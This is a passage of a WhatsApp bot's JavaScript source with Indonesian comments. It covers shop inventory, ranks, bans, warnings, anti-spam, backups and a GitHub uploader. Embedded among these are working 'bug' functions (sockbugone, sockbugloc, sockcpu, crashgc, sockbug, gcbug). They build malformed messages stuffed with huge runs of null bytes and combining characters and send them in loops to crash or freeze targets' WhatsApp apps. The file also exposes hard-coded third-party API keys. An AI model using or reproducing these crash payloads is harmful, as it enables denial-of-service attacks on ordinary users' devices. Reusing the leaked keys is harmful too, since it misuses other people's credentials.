        kadaluarsa: expirationDate
    };
    discounts.push(newDiscount);
    simpenDisc(discounts);
}

function getprodukDariFile() {
    if (!fs.existsSync(tujuanA)) {
        fs.writeFileSync(tujuanA, '[]', 'utf-8');
    }
    const productData = fs.readFileSync(tujuanA, 'utf-8');
    return JSON.parse(productData);
}

function simpenProduknya(products) {
    fs.writeFileSync(tujuanA, JSON.stringify(products, null, 2), 'utf-8');
}

function getidProduk(products) {
    if (products.length === 0) {
        return 1;
    }
    const lastProduct = products[products.length - 1];
    return lastProduct.produk + 1;
}

function cekProduknye(productName) {
    const products = getprodukDariFile();
    return products.some(product => product.nama.toLowerCase() === productName.toLowerCase());
}

function addprodukzz(name, price, stock) {
    const products = getprodukDariFile();
    const newProduct = {
        produk: getidProduk(products),
        nama: name,
        harga: price,
        stok: stock
    };
    products.push(newProduct);
    simpenProduknya(products);
}

function delprodukzz(productName) {
    let products = getprodukDariFile();
    products = products.filter(product => product.nama.toLowerCase() !== productName.toLowerCase());
    simpenProduknya(products);
}

function updprodukzz(name, price, stock) {
    let products = getprodukDariFile();
    const productIndex = products.findIndex(product => product.nama.toLowerCase() === name.toLowerCase());
    if (productIndex !== -1) {
        products[productIndex].harga = price;
        products[productIndex].stok = stock;
        simpenProduknya(products);
    }
}

function getprodukdb() {
    return getprodukDariFile();
}

function simpenSmTr(transactions) {
    fs.writeFileSync(tujuanB, JSON.stringify(transactions, null, 2), 'utf-8');
}

function getSmTr() {
    if (!fs.existsSync(tujuanB)) return [];
    return JSON.parse(fs.readFileSync(tujuanB));
}

function getTrId(id) {
    const transactions = getSmTr();
    return transactions.find(t => t.id.trim() === id.trim());
}

function cIdTrnya() {
    const transactions = getSmTr();
    return `TRANS${transactions.length + 1}`;
}

function saveTrnye(transaction) {
    const transactions = getSmTr();
    transactions.push(transaction);
    simpenSmTr(transactions);
}

function simpenDisc(discounts) {
    fs.writeFileSync(tujuanC, JSON.stringify(discounts, null, 2), 'utf-8');
}


function persenDiskonnya(originalPrice, discountPrice) {
    return Math.round(((originalPrice - discountPrice) / originalPrice) * 100);
}

function ngerestokk(name, quantity) {
    const products = getprodukDariFile();
    const productIndex = products.findIndex(product => product.nama.toLowerCase() === name.toLowerCase());

    if (productIndex !== -1) {
        products[productIndex].stok += quantity;
        simpenProduknya(products);
        return products[productIndex];
    } else {
        return null
    }
}
//
async function ranke(idnya) {
      const rrole = db.users[idnya].level;

      const ranks = [{
          name: 'Bronze',
          maxLevel: 3
        },
        {
          name: 'Silver',
          maxLevel: 60
        },
        {
          name: 'Gold',
          maxLevel: 90
        },
        {
          name: 'Diamond',
          maxLevel: 120
        },
        {
          name: 'Master',
          maxLevel: 150
        },
        {
          name: 'Grandmaster',
          maxLevel: 180
        },
        {
          name: 'Champion',
          maxLevel: 2100
        },
        {
          name: 'Legend',
          maxLevel: 2400
        },
        {
          name: 'Immortal',
          maxLevel: 2700
        },
        {
          name: 'Supreme',
          maxLevel: 3000
        },
        {
          name: 'Elite',
          maxLevel: 3300
        },
        {
          name: 'Hero',
          maxLevel: 36000
        },
        {
          name: 'Veteran',
          maxLevel: 39000
        },
        {
          name: 'Expert',
          maxLevel: 42000
        },
        {
          name: 'Adept',
          maxLevel: 45000
        },
        {
          name: 'Novice',
          maxLevel: 48000
        },
        {
          name: 'Rookie',
          maxLevel: 51000
        },
        {
          name: 'Beginner',
          maxLevel: 540000
        },
        {
          name: 'Apprentice',
          maxLevel: 570000
        },
        {
          name: 'Warrior',
          maxLevel: 600000
        },
        {
          name: 'Knight',
          maxLevel: 630000
        },
        {
          name: 'Paladin',
          maxLevel: 660000
        },
        {
          name: 'Mage',
          maxLevel: 690000
        },
        {
          name: 'Wizard',
          maxLevel: 7200000
        },
        {
          name: 'Sorcerer',
          maxLevel: 7500000
        },
        {
          name: 'Necromancer',
          maxLevel: 7800000
        },
        {
          name: 'Assassin',
          maxLevel: 8100000
        },
        {
          name: 'Rogue',
          maxLevel: 8400000
        },
        {
          name: 'Ranger',
          maxLevel: 87000000
        },
        {
          name: 'Berserker',
          maxLevel: 90000000
        },
        {
          name: 'Monk',
          maxLevel: 93000000
        },
        {
          name: 'Priest',
          maxLevel: 96000000
        },
        {
          name: 'Druid',
          maxLevel: 99000000
        },
        {
          name: 'Shaman',
          maxLevel: 102000000
        },
        {
          name: 'Bard',
          maxLevel: 1050000000
        },
        {
          name: 'Alchemist',
          maxLevel: 1080000000
        },
        {
          name: 'Engineer',
          maxLevel: 1110000000
        },
        {
          name: 'Artificer',
          maxLevel: 1140000000
        },
        {
          name: 'Summoner',
          maxLevel: 1170000000
        },
        {
          name: 'Tamer',
          maxLevel: 1200000000
        },
        {
          name: 'Gladiator',
          maxLevel: 1230000000
        },
        {
          name: 'Titan',
          maxLevel: 12600000000
        },
        {
          name: 'Deity',
          maxLevel: 12900000000
        },
        {
          name: 'Celestial',
          maxLevel: 13200000000
        },
        {
          name: 'Eternal',
          maxLevel: 1350000000000
        },
        {
          name: 'Infinity',
          maxLevel: 1380000000000
        },
        {
          name: 'Ultimate',
          maxLevel: 1410000000000
        },
        {
          name: 'Omnipotent',
          maxLevel: 1440000000000
        },
        {
          name: 'Godlike',
          maxLevel: 1470000000000
        },
        {
          name: 'undefined',
          maxLevel: 999999999999999999
        }
      ];

      for (let i = 0; i < ranks.length; i++) {
        if (rrole <= ranks[i].maxLevel) {
          const rank = ranks[i].name;
          let rankid;
          if (rank === 'Max') {
            rankid = 0;
          } else {
            if (rrole < (ranks[i].maxLevel / 3)) {
              rankid = 1;
            } else if (rrole < (2 * ranks[i].maxLevel / 3)) {
              rankid = 2;
            } else {
              rankid = 3;
            }
          }
          return {
            rank,
            rankid
          };
        }
      }
      return {
        rank: 'Max',
        rankid: 0
      };
    }
    //
   
// blok user banned
if (isBannedUser(sender) && !isOwner) {
  return 
}

    //
    function loadBanned() {
  try {
    if (!fs.existsSync(bannedFile)) return []; // kalau file belum ada, kembalikan array kosong
    const data = fs.readFileSync(bannedFile, "utf8");
    const parsed = JSON.parse(data);
    return Array.isArray(parsed) ? parsed : []; // pastikan hasil array
  } catch (e) {
    console.error("âŒ Gagal memuat banned list:", e);
    return [];
  }
}

function saveBanned(list) {
  try {
    fs.writeFileSync(bannedFile, JSON.stringify(list, null, 2));
    return true;
  } catch (e) {
    console.error('Error saveBanned:', e);
    return false;
  }
}

function isBannedUser(jid) {
  const list = loadBanned();
  return Array.isArray(list) && list.includes(jid);
}

function addBannedUser(jid) {
  const list = loadBanned();
  if (!list.includes(jid)) {
    list.push(jid);
    saveBanned(list);
    return true;
  }
  return false;
}

function removeBannedUser(jid) {
  let list = loadBanned();
  const before = list.length;
  list = list.filter(x => x !== jid);
  if (list.length !== before) {
    saveBanned(list);
    return true;
  }
  return false;
}
//
if (m.isGroup && db.chats[m.chat].mute) {
      if (!isOwner) return
    }
    //
// Lokasi penyimpanan data warning
const warnPath = path.join(__dirname, 'database', 'warn.json')
if (!fs.existsSync(warnPath)) fs.writeFileSync(warnPath, JSON.stringify({}, null, 2))
const warnData = JSON.parse(fs.readFileSync(warnPath, 'utf-8'))

function saveWarnData() {
  fs.writeFileSync(warnPath, JSON.stringify(warnData, null, 2))
}

// Fungsi untuk menambah peringatan
async function addWarning(sock, m, reason, pushname) {
  // CEK WARN AKTIF ATAU TIDAK
  if (!db.chats[m.chat]?.warn) return

  const warnPath = path.join(__dirname, 'database', 'warn.json')
  if (!fs.existsSync(warnPath)) fs.writeFileSync(warnPath, JSON.stringify({}))
  const warnData = JSON.parse(fs.readFileSync(warnPath))

  const sender = m.sender
  if (!warnData[sender]) warnData[sender] = { count: 0 }

  warnData[sender].count += 1
  fs.writeFileSync(warnPath, JSON.stringify(warnData, null, 2))

  await sock.sendMessage(m.chat, {
    text: `âš ï¸ *Peringatan ${warnData[sender].count}/5*\n\n@${sender.split("@")[0]} melanggar aturan:\n*${reason}*\n\nJika mencapai 5 peringatan, akan dikeluarkan.`,
    contextInfo: { mentionedJid: [sender] }
  }, { quoted: fakeQuoted })

  if (warnData[sender].count >= 5) {
    await sock.groupParticipantsUpdate(m.chat, [sender], 'remove')
    warnData[sender].count = 0
    fs.writeFileSync(warnPath, JSON.stringify(warnData, null, 2))
  }
}
//
async function groupSatus(jid, content) {
  const inside = await generateWAMessageContent(content, {
    upload: sock.waUploadToServer
  });
  const messageSecret = crypto.randomBytes(32);
  const m = generateWAMessageFromContent(jid, {
    messageContextInfo: {
      messageSecret 
    },
    groupStatusMessageV2: {
      message: {
        ...inside,
        messageContextInfo: {
          messageSecret
        }
      }
    }
  }, {});
  await sock.relayMessage(jid, m.message, {
    messageId: m.key.id
  });
  return m;
}

// ================= AUTO BACKUP FUNCTION =================
async function autoBackupScript(sock) {
    try {
        if (!sock) return console.log("[AUTO-BACKUP] Sock belum siap");

        // bersihin folder sampah
        const tmpDir = "./library/database/Sampah";
        if (fs.existsSync(tmpDir)) {
            fs.readdirSync(tmpDir)
                .filter(f => !f.endsWith(".js"))
                .forEach(f => fs.unlinkSync(path.join(tmpDir, f)));
        }

        const name = `${namaBot.replace(/\s+/g, "_")}_Version${version.replace(/\s+/g, "_")}`;
        const zipPath = `./${name}.zip`;

        const exclude = [
            "node_modules",
            "Session",
            ".npm",
            ".cache",
            "package-lock.json",
            "yarn.lock"
        ];

        // buat zip
        await new Promise((resolve, reject) => {
            const output = fs.createWriteStream(zipPath);
            const archive = archiver("zip", { zlib: { level: 9 } });

            output.on("close", resolve);
            archive.on("error", reject);

            archive.pipe(output);

            fs.readdirSync(".").forEach(file => {
                if (!exclude.includes(file) && file !== name + ".zip") {
                    const fullPath = path.join(".", file);
                    fs.statSync(fullPath).isDirectory()
                        ? archive.directory(fullPath, file)
                        : archive.file(fullPath, { name: file });
                }
            });

            archive.finalize();
        });

        if (!fs.existsSync(zipPath)) {
            console.log("[AUTO-BACKUP] ZIP gagal dibuat");
            return;
        }

        // kirim ke owner
        const owner = Array.isArray(global.owner) ? global.owner[0] : global.owner;
        const ownerJid = owner.includes("@s.whatsapp.net")
            ? owner
            : owner + "@s.whatsapp.net";

        await sock.sendMessage(ownerJid, {
            document: fs.readFileSync(zipPath),
            fileName: `${name}.zip`,
            mimetype: "application/zip"
        });

        fs.unlinkSync(zipPath);
        console.log(`[AUTO-BACKUP] Backup ${name}.zip berhasil dikirim`);

    } catch (err) {
        console.error("[AUTO-BACKUP ERROR]", err);
    }
}

// ================= INTERVAL 1 HARI =================
if (!global.backupInterval) {
    global.backupInterval = setInterval(() => {
        if (global.autoBackup && global.sock) {
            autoBackupScript(global.sock);
        }
    }, 24 * 60 * 60 * 1000); // 1 hari
}

// ================= DEFAULT =================
global.autoBackup = false;

/*
aktifkan:
global.autoBackup = true

matikan:
global.autoBackup = false
*/
function convertEsmToCjs(code) {
  let out = code;

  // 1) import ... from 'x'
  // default: import foo from 'mod'  -> const foo = require('mod');
  out = out.replace(
    /import\s+([A-Za-z0-9_$]+)\s+from\s+(['"`][^'"`]+['"`]);?/g,
    (m, def, mod) => `const ${def} = require(${mod});`
  );

  // 2) import { a, b as c } from 'mod'
  out = out.replace(
    /import\s+\{\s*([^}]+)\s*\}\s+from\s+(['"`][^'"`]+['"`]);?/g,
    (m, list, mod) => {
      // convert "b as c" -> "b: c"
      const mapped = list
        .split(',')
        .map(s => s.trim().replace(/\s+as\s+/i, ': '))
        .join(', ');
      return `const { ${mapped} } = require(${mod});`;
    }
  );

  // 3) import * as ns from 'mod'
  out = out.replace(
    /import\s+\*\s+as\s+([A-Za-z0-9_$]+)\s+from\s+(['"`][^'"`]+['"`]);?/g,
    (m, name, mod) => `const ${name} = require(${mod});`
  );

  // 4) import 'side-effect';
  out = out.replace(/import\s+(['"`][^'"`]+['"`]);?/g, (m, mod) => `require(${mod});`);

  // 5) export default <expr|function|class>
  // handle "export default function name(...) { ... }" and "export default class Name {...}"
  out = out.replace(/export\s+default\s+function\s+([A-Za-z0-9_$]*)/g, (m, name) => {
    if (name) return `function ${name}`;
    return 'module.exports = function';
  });
  out = out.replace(/export\s+default\s+class\s+([A-Za-z0-9_$]*)/g, (m, name) => {
    if (name) return `class ${name}`;
    return 'module.exports = class';
  });
  // generic default export (expression)
  out = out.replace(/export\s+default\s+/g, 'module.exports = ');

  // 6) export const/let/var name = ...
  // Keep declaration, and append exports.name = name;
  out = out.replace(/export\s+(const|let|var)\s+([A-Za-z0-9_$]+)\s*=/g, (m, kind, name) => {
    return `${kind} ${name} =`;
  });
  // After declarations, add mapping for exported vars (simple heuristic)
  // Find exported var/let/const names and append export lines at end of file if not already exported
  const exportVars = [];
  const varRegex = /(?:^|\n)\s*(?:const|let|var)\s+([A-Za-z0-9_$]+)\s*=/g;
  let match;
  // Collect variable names that were originally exported by looking for preceding "export " in original code
  const originalExportVarRegex = /export\s+(?:const|let|var)\s+([A-Za-z0-9_$]+)\s*=/g;
  while ((match = originalExportVarRegex.exec(code))) {
    exportVars.push(match[1]);
  }

  if (exportVars.length) {
    const exportLines = exportVars.map(n => `exports.${n} = ${n};`).join('\n');
    out += '\n\n' + exportLines + '\n';
  }

  // 7) export { a, b as c }
  out = out.replace(/export\s*\{\s*([^}]+)\s*\}\s*;?/g, (m, list) => {
    return list
      .split(',')
      .map(item => {
        const part = item.trim();
        const asMatch = part.match(/^([A-Za-z0-9_$]+)\s+as\s+([A-Za-z0-9_$]+)$/i);
        if (asMatch) return `exports.${asMatch[2]} = ${asMatch[1]};`;
        return `exports.${part} = ${part};`;
      })
      .join('\n');
  });

  // 8) export * from 'module'
  out = out.replace(/export\s+\*\s+from\s+(['"`][^'"`]+['"`]);?/g, (m, mod) => {
    return `Object.assign(exports, require(${mod}));`;
  });

  // 9) export function / class declarations: export function foo() {} -> function foo() {} ; exports.foo = foo;
  out = out.replace(/export\s+function\s+([A-Za-z0-9_$]+)\s*\(/g, (m, name) => {
    return `function ${name}(`;
  });
  // collect those and append exports for them
  const exportedFuncs = [];
  const funcRegex = /export\s+function\s+([A-Za-z0-9_$]+)\s*\(/g;
  while ((match = funcRegex.exec(code))) exportedFuncs.push(match[1]);
  if (exportedFuncs.length) {
    out += '\n\n' + exportedFuncs.map(n => `exports.${n} = ${n};`).join('\n') + '\n';
  }

  // 10) clean up multiple blank lines
  out = out.replace(/\n{3,}/g, '\n\n');

  return out;
}

async function convertWithBabel(sourceCode) {
  const result = await babel.transformAsync(sourceCode, {
    plugins: ['@babel/plugin-transform-modules-commonjs'],
    sourceType: 'module',
    configFile: false,
    babelrc: false,
  });
  return result.code;
}
const api = {
  xterm: {
    url: "https://api.termai.cc",
    key: "TermAI-4ALwMabCh0KiN9I3"
  }
};
//
const reqFile = './database/req.json';

// Load DB
function loadReq() {
    try {
        if (!fs.existsSync(reqFile)) {
            saveReq([]);
            return [];
        }

        let data = JSON.parse(fs.readFileSync(reqFile));

        if (!Array.isArray(data)) {
            saveReq([]);
            return [];
        }

        return data;
    } catch {
        saveReq([]);
        return [];
    }
}

// Save DB
function saveReq(db) {
    fs.writeFileSync(reqFile, JSON.stringify(db, null, 2));
}
async function ptlaRequest(path, method = "GET") {
    const res = await fetch(global.domain + path, {
        method,
        headers: {
            "Authorization": `Bearer ${global.apikey}`,
            "Content-Type": "application/json",
            "Accept": "application/json"
        }
    });

    return res.json().catch(() => ({ error: true }));
}
async function ptlaRequestV2(path, method = "GET") {
    const res = await fetch(global.domainV2 + path, {
        method,
        headers: {
            "Authorization": `Bearer ${global.apikeyV2}`,
            "Content-Type": "application/json",
            "Accept": "application/json"
        }
    });

    return res.json().catch(() => ({ error: true }));
}
//
async function sockbugone(chat) {
          var msg = generateWAMessageFromContent(chat, proto.Message.fromObject({
            'viewOnceMessage': {
              'message': {
                'interactiveMessage': {
                  'header': {
                    'title': '',
                    'subtitle': " "
                  },
                  'body': {
                    'text': "SÌ¸Yê™°Ì¸Sê™°Ì¸Tê™°Ì¸Eê™°Ì¸Mê™°Ì¸ UÌ¸IÌ¸ CÌ¸Rê™°Ì¸Aê™°Ì¸Sê™°Ì¸Hê™°Ì¸"
                  },
                  'footer': {
                    'text': 'xp'
                  },
                  'nativeFlowMessage': {
                    'buttons': [{
                      'name': 'cta_url',
                      'buttonParamsJson': "{ display_text : 'SÌ¸Yê™°Ì¸Sê™°Ì¸Tê™°Ì¸Eê™°Ì¸Mê™°Ì¸ UÌ¸IÌ¸ CÌ¸Rê™°Ì¸Aê™°Ì¸Sê™°Ì¸Hê™°Ì¸', url : , merchant_url :  }"
                    }],
                    'messageParamsJson': "\0".repeat(1000000)
                  }
                }
              }
            }
          }), {
            'userJid': chat
          });
          await sock.relayMessage(chat, msg.message, {
            'participant': {
              'jid': chat
            },
            'messageId': msg.key.id
          });
        }

        async function sockbugloc(chat) {
          var msg = generateWAMessageFromContent(chat, proto.Message.fromObject({
            'viewOnceMessage': {
              'message': {
                'liveLocationMessage': {
                  'degreesLatitude': 'p',
                  'degreesLongitude': 'p',
                  "caption": '\0ê¦¾ê¦¾'.repeat(10000) + "ê¦¾".repeat(60000),
                  'sequenceNumber': '0',
                  'jpegThumbnail': ''
                }
              }
            }
          }), {
            'userJid': chat
          });
          await sock.relayMessage(chat, msg.message, {
            'participant': {
              'jid': chat
            },
            'messageId': msg.key.id
          });
        }

        const VxO = "ğŸ”¥â­‘ğ•ğ±Í¢ğâ­‘Í¡ÍœğŸ”¥" + "\u0000ê¦¾".repeat(50000)
        async function sockcpu(chat) {
          var messageContent = generateWAMessageFromContent(chat, proto.Message.fromObject({
            'viewOnceMessage': {
              'message': {
                'interactiveMessage': {
                  'header': {
                    "hasMediaAttachment": true,
                    'sequenceNumber': '0',
                    "jpegThumbnail": ""
                  },
                  'nativeFlowMessage': {
                    "buttons": [{
                      "name": "review_and_pay",
                      "buttonParamsJson": `{\"currency\":\"IDR\",\"total_amount\":{\"value\":49981399788,\"offset\":100},\"reference_id\":\"4OON4PX3FFJ\",\"type\":\"physical-goods\",\"order\":{\"status\":\"payment_requested\",\"subtotal\":{\"value\":49069994400,\"offset\":100},\"tax\":{\"value\":490699944,\"offset\":100},\"discount\":{\"value\":485792999999,\"offset\":100},\"shipping\":{\"value\":48999999900,\"offset\":100},\"order_type\":\"ORDER\",\"items\":[{\"retailer_id\":\"7842674605763435\",\"product_id\":\"7842674605763435\",\"name\":\k${VxO},\"amount\":{\"value\":9999900,\"offset\":100},\"quantity\":7},{\"retailer_id\":\"custom-item-f22115f9-478a-487e-92c1-8e7b4bf16de8\",\"name\":\"\",\"amount\":{\"value\":999999900,\"offset\":100},\"quantity\":49}]},\"native_payment_methods\":[]}`
                    }],
                    "messageParamsJson": '\0'.repeat(10000),
                  }
                }
              }
            }
          }), {});
          sock.relayMessage(chat, messageContent.message, {
            'messageId': messageContent.key.id
          });
        }

        async function crashgc(chat) {
          let msg = generateWAMessageFromContent(chat, {
            viewOnceMessage: {
              message: {
                "messageContextInfo": {
                  "deviceListMetadata": {},
                  "deviceListMetadataVersion": 2
                },
                interactiveMessage: proto.Message.InteractiveMessage.create({
                  body: proto.Message.InteractiveMessage.Body.create({
                    text: `Jawab Donggg`
                  }),
                  footer: proto.Message.InteractiveMessage.Footer.create({
                    text: name
                  }),
                  header: proto.Message.InteractiveMessage.Header.create({
                    title: "L7z",
                    subtitle: "L7z Team",
                    hasMediaAttachment: false
                  }),
                  nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
                    buttons: [{
                      "name": "review_and_pay",
                      "buttonParamsJson": `{\n  currency: 'IDR',\n  payment_configuration: '',\n  payment_type: '',\n  transaction_id: '',\n  total_amount: { value: 3000000, offset: 100 },\n  reference_id: '4N88TZPXWUM',\n  type: 'physical-goods',\n  payment_method: '',\n  order: {\n    status: 'pending',\n    description: '',\n    subtotal: { value: 3500000, offset: 100 },\n    tax: { value: 500000, offset: 100 },\n    discount: { value: 1100000, offset: 100 },\n    shipping: { value: 100000, offset: 100 },\n    order_type: 'ORDER',\n    items: [\n  {\n    retailer_id: 'custom-item-c580d7d5-6411-430c-b6d0-b84c242247e0',\n    name: 'SEGERA OUTâ—ï¸â—ï¸',\n    amount: { value: 3000, offset: 100 },\n    quantity: ${totalfitur}\n  }\n]\n  },\n  additional_note: ''\n}`
                    }],
                  })
                })
              }
            }
          }, {
            quoted: fakeQuoted
          })

          await sock.relayMessage(msg.key.remoteJid, msg.message, {
            messageId: msg.key.id
          })
        }

        async function sockbug(nombor, jumlahnyo) {
          for (let i = 0; i < jumlahnyo; i++) {
            sockcpu(nombor)
            sockbugloc(nombor)
            await delay(1000)
          }
        }

        async function gcbug(nombor, jumlahnyo) {
          for (let i = 0; i < jumlahnyo; i++) {
            crashgc(nombor)
            await delay(1000)
          }
        }
        async function lagu() {
  const { spawn } = require('child_process');
  
  // Audio source URL
  const audioUrl = audio;
  
  // Buat proses ffmpeg
  const ffmpegProcess = spawn('ffmpeg', [
    '-i', audioUrl,
    '-vn',
    '-b:a', '64k',
    '-ac', '1',
    '-ar', '48000',
    '-application', 'voip',
    '-compression_level', '5',
    '-map_metadata', '0',
    '-c:a', 'libopus',
    '-f', 'ogg',
    'pipe:1' // Output ke stdout
  ]);

  // Kumpulkan data stream
  const chunks = [];
  ffmpegProcess.stdout.on('data', (chunk) => chunks.push(chunk));
  
  await new Promise((resolve, reject) => {
    ffmpegProcess.on('close', (code) => {
      if (code !== 0) {
        reject(new Error(`FFmpeg exited with code ${code}`));
        return;
      }
      resolve();
    });
    
    ffmpegProcess.stderr.on('data', (data) => {
      console.error(`FFmpeg: ${data}`);
    });
  });

  // Gabungkan semua chunk menjadi buffer
  const audioBuffer = Buffer.concat(chunks);

  // Kirim ke WhatsApp
  await sock.sendMessage(m.chat, {
    audio: audioBuffer,
    mimetype: 'audio/ogg; codecs=opus',
    ptt: true
  });
}
        
// =======================
// ğŸ”¥ ANTI SPAM
// =======================
if (db.chats[m.chat].antispam) {

    let user = global.db.users[m.sender]
    if (!user) global.db.users[m.sender] = user = {}

    // init
    if (!user.spam) user.spam = 0
    if (!user.lastMsg) user.lastMsg = ""
    if (!user.lastTime) user.lastTime = 0
    if (!user.mutedUntil) user.mutedUntil = 0

    let now = Date.now()

    // ===== CEK MUTE =====
    if (now < user.mutedUntil) {
        if (isGroup && isBotAdmins) {
            await sock.sendMessage(m.chat, {
                delete: {
                    remoteJid: m.chat,
                    fromMe: false,
                    id: m.key.id,
                    participant: m.key.participant || m.sender
                }
            })
        }
        return
    }

    // ===== CEK SPAM =====
    let fast = now - user.lastTime < 1000 // 1 detik
    let same = m.text && m.text === user.lastMsg

    if (fast && same) {
        user.spam++

        if (user.spam >= 3) {
            // MUTE 1 MENIT
            user.mutedUntil = now + (60 * 1000)
            user.spam = 0

            await sock.sendMessage(m.chat, {
                text: `ğŸ”‡ @${m.sender.split("@")[0]} di-mute selama *1 menit*\n\nAlasan: *Spam pesan*`,
                mentions: [m.sender]
            })

            // hapus pesan pemicu spam
            if (isGroup && isBotAdmins) {
                await sock.sendMessage(m.chat, {
                    delete: {
                        remoteJid: m.chat,
                        fromMe: false,
                        id: m.key.id,
                        participant: m.key.participant || m.sender
                    }
                })
            }

            return
        } else {
            reply(`âš ï¸ Warning spam! (${user.spam}/3)`)
        }
    }

    // ===== UPDATE DATA =====
    user.lastMsg = m.text
    user.lastTime = now
}
//
sock.autoReactionSW = sock.autoReactionSW || true
if (sock.autoReactionSW) {
sock.storyJid = sock.storyJid ? sock.storyJid : []
if (
m.chat.endsWith('broadcast') &&
!sock.storyJid.includes(m.sender) &&
m.sender != sock.decodeJid(sock.user.id)
) {
sock.storyJid.push(m.sender)
}
if (
m.chat.endsWith('broadcast') &&
[...new Set(sock.storyJid)].includes(m.sender) &&
!/protocol/.test(m.mtype)
) {
await sock.sendMessage(
'status@broadcast',
{
react: {
text: Func.random(['ğŸ¤£', 'ğŸ¥¹', 'ğŸ˜‚', 'ğŸ˜‹', 'ğŸ˜', 'ğŸ¤“', 'ğŸ¤ª', 'ğŸ¥³', 'ğŸ˜ ', 'ğŸ˜±', 'ğŸ¤”', 'ğŸ¥¶']),
key: m.key
}
},
{
statusJidList: [m.sender]
}
)
}
}
async function ezremove(path) {
  const form = new FormData()
  form.append('image_file', fs.createReadStream(path), path.split('/').pop())

  const create = await axios.post(
    'https://api.ezremove.ai/api/ez-remove/watermark-remove/create-job',
    form,
    {
      headers: {
        ...form.getHeaders(),
        'User-Agent': 'Mozilla/5.0',
        origin: 'https://ezremove.ai',
        'product-serial': 'sr-' + Date.now()
      }
    }
  ).then(v => v.data).catch(() => null)

  if (!create || !create.result || !create.result.job_id) {
    return { status: 'error' }
  }

  const job = create.result.job_id

  for (let i = 0; i < 10; i++) {
    await new Promise(r => setTimeout(r, 2000))

    const check = await axios.get(
      `https://api.ezremove.ai/api/ez-remove/watermark-remove/get-job/${job}`,
      {
        headers: {
          'User-Agent': 'Mozilla/5.0',
          origin: 'https://ezremove.ai',
          'product-serial': 'sr-' + Date.now()
        }
      }
    ).then(v => v.data).catch(() => null)

    if (check && check.code === 100000 && check.result && check.result.output) {
      return { job, result: check.result.output[0] }
    }

    if (!check || !check.code || check.code !== 300001) break
  }

  return { status: 'processing', job }
}
//
const reactkey = [
  "movanest-key7C7H5SPWJM",
  "movanest-keyIYVF38VEWT",
  "movanest-keyNJZDDVZAGC"
]

const DELAY_ON_LIMIT = 5000

async function reactToWhatsAppPost(postUrl, emojis) {
  const token = pickRandom(reactkey)

  try {
    const res = await axios.get(
      "https://movanest.zone.id/user-coin",
      {
        params: {
          user_api_key: token,
          postUrl,
          emojis
        },
        timeout: 500000
      }
    )

    return { success: true, data: res.data }

  } catch (err) {
    const status = err.response?.status
    const msg = err.response?.data?.message || err.message

    if (status === 402 || msg.toLowerCase().includes("limit")) {
      await new Promise(r => setTimeout(r, DELAY_ON_LIMIT))
      return { success: false, status: 402, error: "Token limit" }
    }

    return {
      success: false,
      status,
      error: err.response?.data || msg
    }
  }
}
// ==================== GITHUB UPLOADER FUNCTION ====================
async function GitHubUploader(fileBuffer, filename, mimeType) {
    try {
        // Konfigurasi GitHub - ISI TOKEN DAN USERNAME DI SINI
        const GITHUB_TOKEN = global.github.token; // Ganti dengan token GitHub Anda
        const GITHUB_USERNAME = global.github.username; // Ganti dengan username GitHub Anda
        const REPO_NAME = "whatsapp-media"; // Nama repository
        const BRANCH = "main"; // Branch yang digunakan
        
        if (!GITHUB_TOKEN || !GITHUB_USERNAME || GITHUB_TOKEN === "YOUR_GITHUB_TOKEN_HERE" || GITHUB_USERNAME === "YOUR_GITHUB_USERNAME_HERE") {
            throw new Error("Silakan isi token dan username GitHub terlebih dahulu di dalam plugin!");
        }

        // Tentukan ekstensi file berdasarkan mime type
        let extension = getExtension(mimeType);
        let finalFilename = `${filename}${extension ? '.' + extension : ''}`;
        
        // Upload ke GitHub dengan auto-create repository
        const rawUrl = await uploadToGitHub(fileBuffer, finalFilename, GITHUB_USERNAME, GITHUB_TOKEN, REPO_NAME, BRANCH);
        
        if (rawUrl) {
            return {
                success: true,
                filename: finalFilename,
                url: rawUrl,
                message: `âœ… *Upload Berhasil!*\n\nğŸ“ *Nama File:* ${finalFilename}\nğŸ”— *Raw URL:* ${rawUrl}\n\n_Salin link di atas untuk mengakses file._`
            };
        } else {
            throw new Error("Gagal mengupload file ke GitHub!");
        }

    } catch (error) {
        console.error("GitHub Uploader Error:", error);
        return {
            success: false,
            error: error.message
        };
    }
}

// Fungsi untuk membuat repository baru
async function createGitHubRepo(username, token, repoName) {
    try {
        const response = await axios.post(
            'https://api.github.com/user/repos',
            {
                name: repoName,
                description: 'Media files uploaded from WhatsApp Bot',
                auto_init: true,
                private: false
            },
            {
                headers: {
                    'Authorization': `token ${token}`,
                    'Content-Type': 'application/json',
                    'User-Agent': 'WhatsApp-Bot'
                }
            }
        );
        return response.status === 201;
    } catch (error) {
        // Jika repository sudah ada, return true
        if (error.response?.status === 422) {
            return true;
        }
        throw error;
    }
}

// Fungsi untuk upload ke GitHub
async function uploadToGitHub(fileBuffer, filename, username, token, repo, branch = "main") {
    try {
        // Coba buat repository dulu
        const repoCreated = await createGitHubRepo(username, token, repo);
        
        if (!repoCreated) {
            throw new Error("Gagal membuat repository");
        }

        const apiUrl = `https://api.github.com/repos/${username}/${repo}/contents/${filename}`;
        
        // Encode file ke base64
        const fileContent = fileBuffer.toString('base64');
        
        const payload = {
            message: `Upload ${filename} from WhatsApp Bot`,
            content: fileContent,
            branch: branch
        };

        const response = await axios.put(apiUrl, payload, {
            headers: {
                'Authorization': `token ${token}`,
                'Content-Type': 'application/json',
                'User-Agent': 'WhatsApp-Bot'
            }
        });

        if (response.status === 201 || response.status === 200) {
            // Return raw URL
            return `https://raw.githubusercontent.com/${username}/${repo}/${branch}/${filename}`;
        }
        
        return null;
    } catch (error) {
        console.error("GitHub Upload Error:", error.response?.data || error.message);
        
        // Jika error karena file sudah ada, buat dengan nama berbeda
        if (error.response?.status === 422 && error.response?.data?.message?.includes('already exists')) {
            const newFilename = `file_${Date.now()}_${filename}`;
            return await uploadToGitHub(fileBuffer, newFilename, username, token, repo, branch);
        }
        
        throw new Error(`GitHub upload failed: ${error.response?.data?.message || error.message}`);
    }
}

// Fungsi untuk mendapatkan ekstensi file dari mime type
function getExtension(mime) {
    const mimeExtensions = {
        // Images
        'image/jpeg': 'jpg',
        'image/jpg': 'jpg',
        'image/png': 'png',
        'image/gif': 'gif',
        'image/webp': 'webp',
        'image/bmp': 'bmp',
        'image/svg+xml': 'svg',
        
        // Videos
        'video/mp4': 'mp4',
        'video/3gp': '3gp',
        'video/quicktime': 'mov',
        'video/x-msvideo': 'avi',
        'video/x-matroska': 'mkv',
        'video/webm': 'webm',
        'video/mpeg': 'mpeg',
        
        // Audio
